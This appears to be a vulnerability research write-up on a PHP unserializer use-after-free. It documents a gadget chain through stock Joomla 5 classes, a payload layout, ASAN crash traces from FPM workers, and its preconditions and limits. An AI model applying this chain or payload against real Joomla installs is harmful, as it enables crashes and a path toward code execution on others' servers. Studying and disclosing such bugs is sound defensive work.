# Joomla 5 stock-class gadget for the `var_destroy` re-entry UAF

> **Published 2026-10-31.** Part of the `var_destroy` patch-gap
> (`docs/VAR_DESTROY_UAF.md`); the bug itself has been public since 2026-05-02
> (dinosn). See `docs/RESPONSIBLE_PUBLICATION.md`.

**Status:** confirmed under ASAN on PHP 8.4.27 and 8.5.12, with a real
Joomla 5 install and **no lab-defined class**.
**What it removes:** the "loaded gadget class" precondition. Joomla 5 always
registers its Composer autoloader, so the classes below are available without
any plugin or custom code.

## Chain

```text
var_destroy()                                var_unserializer.c:319
  i_zval_ptr_dtor(zv)          (BG(serialize_lock)==0)
    zend_objects_destroy_object
      Joomla\CMS\Mail\Mail::__destruct()               (inherits PHPMailer's)
        PHPMailer::smtpClose()                          PHPMailer.php:2357
          $this->smtp->connected() / quit() / close()   DataSet::__call
            GuzzleHttp\Psr7\FnStream::close()           FnStream.php:108
              ($this->_fn_close)()                      FnStream.php:110
                Joomla\Registry\Registry::__clone()     Registry.php:78
                  unserialize(serialize($this->data))   Registry.php:80  <-- re-entry
```

`SMTP` is present only so `DataSet::__call('connected')` returns a truthy
non-empty array; `quit()` is then a harmless no-op and `close()` reaches
FnStream.

Autoload evidence: `libraries/vendor/composer/autoload_psr4.php` maps
`PHPMailer`, `Joomla\Registry`, `Joomla\Data`, `GuzzleHttp\Psr7`,
`Joomla\CMS`.

## Payload

`a:1018:{ <1016 × i:0;N;> i:99999;<serialized Mail graph> i:99999;i:42;}`
where the Mail graph is `Mail{ smtp: DataSet{ objects: [SMTP,
FnStream{_fn_close:[Registry{data:[]}, "__clone"]}] } }` (~9.4 KB; no
`r:`/`R:` backrefs, so it splices safely). Builder:
`poc/joomla_var_destroy_gadget.php`.

## Evidence

ASAN on both versions:

```text
ERROR: AddressSanitizer: heap-use-after-free ... READ of size 8
  #0 php_var_unserialize            ext/standard/var_unserializer.c:906
  #5 zend_call_function             Zend/zend_execute_API.c:1026
  ...
  #9 zend_objects_destroy_object
  #12 i_zval_ptr_dtor
  #13 var_destroy                   ext/standard/var_unserializer.c:319
freed by: var_destroy (var_unserializer.c:255); allocated by var_push (:135)
```

On stock ZendMM the read is silent (same as the lab class `T`); the FnStream
`__wakeup` LogicException propagates after the destructor.

## Preconditions

1. An application `unserialize()` sink (or a `Phar::getMetadata()` sink —
   see `docs/VAR_DESTROY_UAF.md`), and
2. a Joomla 5 installation whose Composer autoloader has run (every request).

No plugin, no pre-loaded class, no `gc_disable()`.

## WordPress and built-ins (for contrast)

- **WordPress:** a real gadget exists (`SimplePie::__destruct` ->
  `WP_HTML_Token::__destruct` -> `call_user_func` -> `unserialize`), but
  `SimplePie`'s direct `__destruct()` call is guarded by `!gc_enabled()`.
  WP core never disables GC, so it is **not reachable as shipped**.
- **Built-in classes:** only `Phar`/`PharData`/`PharFileInfo` declare
  `__destruct`, and neither re-enters the unserializer (`Phar`'s only deletes
  from the persist map). Clean negative.

## Web-SAPI proof (2026-10-30)

Fired inside real **FPM workers** with a stock Joomla autoloader and an
untracked lab endpoint (`unserialize($_POST['d'])`):

- PHP **8.4.27** ASAN FPM: `heap-use-after-free` at
  `ext/standard/var_unserializer.c:906`, stack through
  `zend_call_function -> zend_objects_destroy_object -> i_zval_ptr_dtor ->
  var_destroy`, `#23 main sapi/fpm/fpm/fpm_main.c`; HTTP 502, worker aborted,
  master respawned.
- PHP **8.2.34** ASAN FPM: same access at `var_unserializer.c:850`.
- Stock ZendMM (both): HTTP 200 with
  `Uncaught LogicException: FnStream should never be unserialized` — the
  destructor chain ran, the UAF read is silent, and the worker keeps serving.
- Phar variant: `getMetadata()` triggers the same FnStream fatal on stock
  8.4.27.

Gates verified: `allowed_classes=false` blocks (0 ASAN reports); the Joomla
autoloader and `_JEXEC` must be set; `disable_functions=unserialize` and a tiny
`post_max_size` block it; no default FPM setting did.

## Terminal-call limitation (important)

The stock Joomla chain **triggers the UAF but cannot supply the terminal
primitive**. `Joomla\Registry\Registry::__clone()` performs
`unserialize(serialize($this->data))`; `serialize()` cannot emit an
out-of-range `R:1020;` reference or place a raw pointer at the stale
`data[id]` slot the forged-carrier ladder needs. So stock Joomla gives the
**UAF / DoS** (ASAN-confirmed) but not `zif_system` execution. The terminal
call still requires a destructor that re-enters `unserialize()` with an
out-of-range reference and a same-size spray (the `CachePurge` pattern in
`poc/app_unserialize_sink.php`) — i.e. an application/plugin gadget of that
specific shape. Carrier placement is independent of this and is solved
(`docs/VAR_DESTROY_UAF.md`).

## Status

This is a **delivery precondition reduction for Joomla**, not a new sink: a
Joomla component/plugin that calls `unserialize()` on attacker data (or
`Phar::getMetadata()`) is now enough to reach the destructor chain with stock
classes. It does not by itself give a remote entry point.
